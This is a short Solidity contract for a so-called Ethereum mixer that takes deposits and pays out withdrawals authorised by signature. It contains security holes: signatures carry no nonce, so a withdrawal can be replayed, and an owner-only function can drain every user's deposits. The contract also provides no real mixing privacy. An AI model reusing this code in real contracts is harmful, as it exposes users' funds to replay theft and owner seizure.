// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthereumMixer {
    address private owner;
    mapping(address => uint256) public balances;

    event Withdrawal(address indexed from, address to, uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not authorized");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
    }

    function emergencyWithdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    function changeOwner(address newOwner) external onlyOwner {
        owner = newOwner;
    }

    function withdraw(address _to, uint256 _amount, bytes memory _signature) external {
        bytes32 message = prefixed(keccak256(abi.encodePacked(_to, _amount, address(this))));
        address depositor = recoverSigner(message, _signature);
        
        require(balances[depositor] >= _amount, "Insufficient balance");
        require(_amount > 0, "Withdraw amount must be greater than 0");
        
        // Subtract amount from balance after withdraw
        balances[depositor] -= _amount;
        
        payable(_to).transfer(_amount);
        emit Withdrawal(depositor, _to, _amount);
    }


    function prefixed(bytes32 _hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", _hash));
    }

    function recoverSigner(bytes32 _message, bytes memory _sig) internal pure returns (address) {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(_sig);
        return ecrecover(_message, v, r, s);
    }

    function splitSignature(bytes memory _sig) internal pure returns (uint8 v, bytes32 r, bytes32 s) {
        require(_sig.length == 65, "Invalid signature length");

        assembly {
            r := mload(add(_sig, 0x20))
            s := mload(add(_sig, 0x40))
            v := byte(0, mload(add(_sig, 0x60)))
        }
    }
}